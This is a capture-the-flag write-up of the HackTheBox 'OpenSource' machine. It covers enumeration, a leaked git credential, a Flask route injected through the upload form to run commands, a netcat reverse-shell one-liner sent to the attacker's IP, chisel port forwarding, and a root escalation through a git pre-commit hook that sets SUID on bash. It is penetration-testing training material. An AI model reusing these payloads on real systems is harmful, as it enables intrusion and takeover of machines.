---
title: HTB | OpenSource
author: Zeropio
date: 2022-08-29
categories: [HackTheBox, Machines]
tags: [htb, linux, easy, machines]
permalink: /htb/labs/machines/opensource
---

![HTB Img](/assets/img/hackthebox/card/OpenSource.png)
# Fingerprinting

The nmap show:

```
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 29 Aug 2022 21:26:33 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 29 Aug 2022 21:26:33 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, HEAD
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp
1 service unrecognized despite returning data.

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

If we go to the webpage we can download a zip with the content of a program. We can see a **.git** folder. Let’s see the branches:

```console
zero@pio$ git branch                                       
	  dev
	* public
```

```console
zero@pio$ git log dev                                      
	commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (dev)
	Author: gituser <gituser@local>
	Date:   Thu Apr 28 13:47:24 2022 +0200
	
	    ease testing
	
	commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
	Author: gituser <gituser@local>
	Date:   Thu Apr 28 13:46:54 2022 +0200
	
	    added gitignore
	
	commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
	Author: gituser <gituser@local>
	Date:   Thu Apr 28 13:46:16 2022 +0200
	
	    updated
	
	commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
	Author: gituser <gituser@local>
	Date:   Thu Apr 28 13:45:17 2022 +0200
	
	    initial
```

We can start searching in each one with `git show <commit>` :

```console
zero@pio$ git show a76f8f75f7a4a12b706b0cf9c983796fa1985820

	git show a76f8f75f7a4a12b706b0cf9c983796fa1985820
	commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
	Author: gituser <gituser@local>
	Date:   Thu Apr 28 13:46:16 2022 +0200
	
	    updated
	
	diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
	new file mode 100644
	index 0000000..5975e3f
	--- /dev/null
	+++ b/app/.vscode/settings.json
	@@ -0,0 +1,5 @@
	+{
	+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
	+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
	+  "http.proxyStrictSSL": false
	+}
	diff --git a/app/app/views.py b/app/app/views.py
```

We can see a pair of credentials: **dev01:Soulless_Developer#2022**. But they are not use for SSH. This commit change the **views.py** file, if we checked it:

```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app

@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')

@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

We see that is using **flask** and **templates**. As well as some path, like **uploads**.

# Foothold

We can try to manipulate the upload function and overwriting the **views.py** file. Go `http://10.10.11.164/upcloud` and upload a file, but intercept the request with burp. We can see that the web is uploading the file as:

![Untitled](/assets/img/hackthebox/labs/opensource/Untitled.png)

We can change this into our reverse shell, using the following content:

```python
@app.route('/shell')
def cmd():
    return os.system(request.args.get('cmd'))
```

This should be the final output:

![Untitled](/assets/img/hackthebox/labs/opensource/Untitled%201.png)

Send it with the forward button from burp.

We can start now a reverse shell:

```console
zero@pio$ netcat -lvnp 443
```

```console
zero@pio$ curl 'http://10.10.11.164/shell?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>%261|nc%2010.10.16.44%20443%20>/tmp/f'
```

And now, we should have our reverse shell stablished. We can see that we are directly root:

```console
/app # whoami
	root
```

A bit strange, no? Testing the network, we can see that we are not in the main machine.

```console
/app # ifconfig
	eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:06  
	          inet addr:172.17.0.6  Bcast:172.17.255.255  Mask:255.255.0.0
	          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
	          RX packets:861 errors:0 dropped:0 overruns:0 frame:0
	          TX packets:747 errors:0 dropped:0 overruns:0 carrier:0
	          collisions:0 txqueuelen:0 
	          RX bytes:83162 (81.2 KiB)  TX bytes:1068984 (1.0 MiB)
	
	lo        Link encap:Local Loopback  
	          inet addr:127.0.0.1  Mask:255.0.0.0
	          UP LOOPBACK RUNNING  MTU:65536  Metric:1
	          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
	          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
	          collisions:0 txqueuelen:1000 
	          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```

We must found a way to scape from this container to our machine. We can notice that from here we have access to the filtered port 3000.

```console
/app # nc -nv 10.10.11.164 3000
	10.10.11.164 (10.10.11.164:3000) open
```

We can try forward the port to our machine with chisel. Download the binary into the container. First use the upload function we have in the web to upload the binary. We can see that the path it is saved is `http://10.10.11.164/uploads/chisel` . If we try downloading from the container we will get an error:

```console
/root # wget http://10.10.11.164/uploads/chisel
	Connecting to 10.10.11.164 (10.10.11.164:80)
	wget: server returned error: HTTP/1.1 500 INTERNAL SERVER ERROR
```

But if we download it from the localhost:

```console
/root # wget http://127.0.0.1/uploads/chisel
	Connecting to 127.0.0.1 (127.0.0.1:80)
	saving to 'chisel'
	chisel               100% |********************************| 8544k  0:00:00 ETA
	'chisel' saved
```

This is because the container doesn’t have a direct connection to the target or our machine. 

We can use chisel on our machine:

```console
zero@pio$ sudo chisel server --port 3000 -v --reverse --socks5
```

And on the container:

```console
/app # ./chisel client 10.10.16.44:3000 R:5000:socks
```

Now we can access it on localhost:5000. We can see that is a git repository, with the previous founded credentials we can get an RSA.

# Privilege Escalation

Executing [pspy](https://github.com/DominicBreuker/pspy) we can see that it is commiting backups automatically:

```
2022/08/29 22:54:01 CMD: UID=0    PID=23023  | git commit -m Backup for 2022-08-29 
2022/08/29 22:54:01 CMD: UID=0    PID=23025  | /bin/sh .git/hooks/pre-commit 
2022/08/29 22:54:01 CMD: UID=0    PID=23026  | git push origin main 
2022/08/29 22:54:01 CMD: UID=0    PID=23032  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git
```

In [GTFObins](https://gtfobins.github.io/gtfobins/git/) we can get some info about the `pre-commit`.  Taking the example for there, let’s try modifying the bash permissions and executing it by ourselves:

```console
-bash-4.4$ echo "chmod u+s /bin/bash" >> ~/.git/hooks/pre-commit
-bash-4.4$ chmod +x !$
chmod +x ~/.git/hooks/pre-commit
bash-4.4# whoami
	root
```